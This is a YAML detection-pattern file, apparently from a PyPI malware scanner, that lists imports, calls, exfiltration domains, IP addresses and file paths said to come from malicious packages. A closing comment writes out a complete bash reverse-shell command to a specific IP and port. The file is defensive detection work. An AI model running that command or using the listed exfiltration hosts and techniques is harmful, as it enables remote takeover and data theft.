# Copyright (c) 2024 - 2024, Oracle and/or its affiliates. All rights reserved.
# Licensed under the Universal Permissive License v 1.0 as shown at https://oss.oracle.com/licenses/upl/.


#This file defines the malicious pattern.
#The pattern is collected from the malware repository of Pypi.org.

imports:
- requests
- base64
- Fernet
- telebot
- platform
- ClientSession
- socket
- os
- getpass
- telegram
- __pyarmor__
- urllib.request.urlopen

ast_calls:
  os_detection:
  - os.name
  code_execution:
  - exec
  - subprocess.run
  - subprocess.call
  - subprocess.Popen
  info_collecting:
  - os.getcwd
  - os.getlogin
  - os.getenv
  - getpass.getuser
  - socket.gethostname
  - platform.node
  obfuscation:
  - base64.b64decode
  - __pyarmor__
        # - Fernet.decrypt
  remote_connection:
  - requests.get
  - requests.post
  - telegram.send_document
  - urllib.request.urlopen
  custom_setup:
  - install
  reverse_shell:
  - os.dup2

ast_constant:
  domains:
  - webhook.site
  - discord
  - cdn.discordapp.com
  - nkmlpvguyjigksybkgmsvvsjuvsuqnnti.oast.fun
  - api.telegram.org
  - diddlydingusdu.de       # builderknower2
  - eozjyg0uj1pesea.m.pipedream.net       # business-kpi-manager
  - 2.tcp.ngrok.io
  - files.pypihosted.org
  - filebin.net
  - akinasouls.fr
  - api.ipify.org       # Get public IP of the victim
  - httpbin.or
  - g5mr93si9nwr0vblbcuk1fp4cvim6du2.oastify.com
  - 29c2aa2421c8.ngrok.ap
  ip:
  - 8.217.153.123
  - 46.29.237.14
  local_path:
  - /storage/emulated/0/       # Android: primary user account on the device
        # DNS
  - /etc/resolv.conf
  - /run/systemd/resolve/stub-resolv.conf
  executable:
  - .exe
  windows:
  - APPDATA

# setup:
#     - cmdclass       # Replace the pip command, for example `install`
#     - install_requires
#     - setup_requires       # Deprecation
#
#
# reverse_shell:
#     - bash -c "bash -i >& /dev/tcp/81.46.246.181/4444 0>&1"
